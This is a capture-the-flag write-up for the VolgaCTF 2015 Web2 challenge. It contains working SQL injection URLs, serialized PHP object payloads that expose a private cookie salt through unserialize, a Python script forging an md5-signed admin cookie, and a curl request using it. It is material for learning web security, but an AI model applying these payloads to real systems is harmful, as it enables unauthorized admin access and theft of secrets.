# VolgaCTF 2015: Web2

**Category:** Web
**Points:** 200
**Description:** 

> Find the key!
> http://web2.2015.volgactf.ru/
> 
> Hints
> 
> 1. Find the logs!

## Write-up

We're presented with a rather empty-looking website called 'HackBlog'. No further links to other pages and the html-source doesn't provide any clues. Let's try robots.txt:

>User-agent: *
>
>Disallow: /
>
>Disallow: /SecretAdminPanel

Okay, lets try /SecretAdminPanel then we get:

>Secret Admin Panel
>Forbidden

Okay, so we need to become admin somehow. The first thing to notice here is that when a GET-request to SecretAdminPanel is made, a cookie called 'PHPSESS' is set with the following value: 

>```
>%7B%22isAdmin%22%3Afalse%7D0afb5cf5c7d66587da7c811767250458	
>```

This seems to be a json-object with a md5-hash concatenated:
>{"isAdmin":false}<hash>

The hash serves as verification that the json-object is not tampered with. Simply md5-ing the json does not equal the hash so we're in the dark. Either we have to brute-force some salt or we have to find something else to exploit and retreive the salt with..

Then the first hint came: "Find the logs!"

Hmm, trying /logs presents us with a page that seems to var_dump multiple arrays corresponding to our previous requests to /SecretAdminPanel, notably the IP is logged and an empty key called 'params'

Lets try requesting SecretAdminPanel with a param:

> /SecretAdminPanel?a=b

We get

>Forbidden
>Don't attempt to hack, all requests will be logged.

And now /logs shows:

>```
>array(2) {
>  ["ip"]=>
>  string(13) "13.37.13.37"
>  ["params"]=>
>  array(1) {
>    ["a"]=>
>    string(1) "b"
>  }
>}
>```

Hmm? I wonder if we can inject something here? 
After some tampering i got an error with: 

http://web2.2015.volgactf.ru/SecretAdminPanel?a[a%27]

>Forbidden
>Don't attempt to hack, all requests will be logged.
>Error: unrecognized token: "";s:0:"";}}')"

That seems to be a serialized php-object, i wonder if its the param-object?

http://web2.2015.volgactf.ru/SecretAdminPanel?a[a%27]=ccccc

>Forbidden
>Don't attempt to hack, all requests will be logged.
>Error: near "";s:5:"": syntax error

Seems like it! the s:0 changed to s:5 when entering 5 chars into ?a

So what now? We most probably are injecting into a sql query, 

http://web2.2015.volgactf.ru/SecretAdminPanel?a[-1%27);select%20*;--

>Error: no tables specified

Bingo!

After some searching i found out that logs is the only table in the database, with 2 columns: ip and params

Lets try to insert our own serialized sting and see if it gets unserialized:

$php -r 'var_dump(serialize(array("smoke"=>"leet", "everyday")));'
string(48) "a:2:{s:5:"smoke";s:4:"leet";i:0;s:8:"everyday";}"

Insert it with:

http://web2.2015.volgactf.ru/SecretAdminPanel?a[a%27);insert%20into%20logs%20values%20(1,%20%27a:2:{s:5:%22smoke%22;s:4:%22leet%22;i:0;s:8:%22everyday%22;}%27)--

And request /logs again:

>```
>array(2) {
>  ["ip"]=>
>  string(1) "1"
>  ["params"]=>
>  array(2) {
>    ["smoke"]=>
>    string(4) "leet"
>    [0]=>
>    string(8) "everyday"
>  }
>}
>```

Nice! so, lets try an object:

> $ php -r 'class SomeObject {};var_dump(serialize(new SomeObject()));'
> string(22) "O:10:"SomeObject":0:{}"

>```
>array(2) {
>  ["ip"]=>
>  string(1) "1"
>  ["params"]=>
>  object(__PHP_Incomplete_Class)#7 (1) {
>    ["__PHP_Incomplete_Class_Name"]=>
>    string(10) "SomeObject"
>  }
>}
>```

Allright! Definitely an unserialize(); .. almost there.. now.. what object could we be interested in? Remember, to become admin we most likely need to find some sort of secret cookie salt value, so let's just try Session or something..

> O:7:"Session":0:{}

http://web2.2015.volgactf.ru/SecretAdminPanel?a[a%27);insert%20into%20logs%20values%20(1,%20%27O:7:%22Session%22:0:{}%27)--

>```
>array(2) {
>  ["ip"]=>
>  string(1) "1"
>  ["params"]=>
>  object(Session)#7 (2) {
>    ["cookieSalt":"Session":private]=>
>    string(20) "nO97M0Za6cu9wDC72VVv"
>    ["params":"Session":private]=>
>    array(0) {
>    }
>  }
>}
>```

Cool! Thats the cookieSalt we're looking for.. lets verify and generate a valid cookie where isAdmin=true:

>```python
>#!/usr/bin/env python
>
># PHPSESS=%7B%22isAdmin%22%3Afalse%7D0afb5cf5c7d66587da7c811767250458
>import hashlib
>import string 
>
>
>payload = '{"isAdmin":false}'
>orig_hash = "0afb5cf5c7d66587da7c811767250458"
># assume 0afb5cf5c7d66587da7c811767250458 is md5
>
># it could be either md5, md4, md2, haval128, ntlm
>
>def genhash(msg):
>	return hashlib.md5(msg).hexdigest()
>
>
>cookiesalt = "nO97M0Za6cu9wDC72VVv"
>print genhash("%s%s" % ( payload, cookiesalt ))
>wish = '{"isAdmin":true}'
>solution = genhash("%s%s" % ( wish, cookiesalt ))
>print "%s%s" % (wish, solution)
>```python

This gives us:

> {"isAdmin":true}59218ddbff65da5eb025f5ee88260c9e

By requesting /SecretAdminPanel with cookie PHPSESS=%7B%22isAdmin%22%3Atrue%7D59218ddbff65da5eb025f5ee88260c9e

>```bash
>curl --cookie "PHPSESS=%7B%22isAdmin%22%3Atrue%7D59218ddbff65da5eb025f5ee88260c9e" --url "http://web2.2015.volgactf.ru/SecretAdminPanel"
>```

We get the flag:

>```html
> <h1>Secret Admin Panel</h1>
> <p>
> {417a4c17bd3132bba864dac9edf4ae7a}</p>	</div>
> </body>
>```